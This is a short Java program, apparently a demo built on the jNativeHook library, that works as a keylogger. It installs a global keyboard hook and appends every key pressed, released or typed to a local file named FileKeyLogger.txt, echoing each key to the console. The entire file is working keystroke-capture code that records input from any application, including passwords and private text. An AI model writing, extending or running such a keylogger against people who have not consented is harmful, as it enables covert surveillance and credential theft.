import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent; 
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;


public class jNativeHookExample implements NativeKeyListener{
	
    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
        	File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e2) {
			System.out.println("Error al escribir");
		}
 
        /* Terminate program when one press ESCAPE */
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
    }
 
    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		try {
			System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			System.out.println("Error al escribir");
		}
    }
 
    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			System.out.println("Error al escribir");
		}
    }
 
    public static void main(String[] args) {
        try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            /* Its error */
            e.printStackTrace();
        }
 
        /* Construct the example object and initialze native hook. */
        GlobalScreen.addNativeKeyListener(new jNativeHookExample());
    }
}